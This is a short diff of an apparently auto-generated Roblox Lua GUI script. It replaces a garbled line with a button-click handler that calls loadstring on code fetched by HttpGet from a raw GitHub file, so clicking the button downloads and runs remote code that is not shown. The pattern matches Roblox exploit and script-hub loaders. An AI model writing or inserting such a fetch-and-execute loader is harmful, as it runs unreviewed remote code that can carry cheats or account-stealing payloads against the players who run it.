@@ -458,7 +458,9 @@ coroutine.wrap(BRLC_fake_script)()
 local function CWUWGO_fake_script() -- fghj_3.Script 
 	local script = Instance.new('Script', fghj_3)
 
-	script.Parent.MouseButton1Click:Conhttps://raw.githubusercontent.com/pateu198/swearee/main/.555555'),true))()
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/pateu198/swearee/main/.555555'),true))()
 	end)
 	
 end
